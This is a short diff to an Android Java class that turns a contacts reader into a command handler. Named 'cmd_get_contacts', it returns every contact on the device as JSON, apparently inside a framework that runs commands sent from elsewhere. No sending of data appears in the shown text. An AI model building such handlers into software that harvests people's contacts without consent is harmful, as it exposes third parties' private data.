@@ -4,17 +4,24 @@ import android.database.Cursor;
 import android.provider.ContactsContract;
 
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.List;
 
-public class CommandGetContacts {
+public class CommandGetContacts implements Command {
 
-    public static String cmd = "%CMD_GETCONTACTS%";
+    public static String cmd = "cmd_get_contacts";
+    public String getCommandName() {
+        return cmd;
+    }
 
+    public JSONObject execute(android.content.Context ctx, List<String> args) {
+        return getAllContacts(ctx.getContentResolver());
+    }
     // https://www.dev2qa.com/how-to-get-contact-list-in-android-programmatically/
-    public static JSONObject getAllContacts(android.content.ContentResolver cr) {
+    public JSONObject getAllContacts(android.content.ContentResolver cr) {
         JSONArray res_val = new JSONArray();
         JSONObject res = new JSONObject();
 
